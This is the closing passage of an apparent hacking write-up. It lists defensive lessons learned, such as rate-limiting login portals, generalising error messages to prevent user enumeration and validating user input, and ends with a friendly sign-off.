If you have trouble understanding which interal function does what, Python documentation is a fantastic resource to check out.

## Lessons Learned

1. Do not leave functionalities lying on the server if it is not required, they can be abused
2. Ensure there is a rate limiting feature to your login portals.
3. No need to provide verbose errors (user enumeration), always generalize the error messages
4. Ensure necessary checks are put when dealing with user input, it should never be trusted.
5. Differences in a 32-bit and 64-bit shells

## Fin

If you did not understand something, have some suggestion, or found some error, feel free to contact me :)
Take care and keep hacking, folks!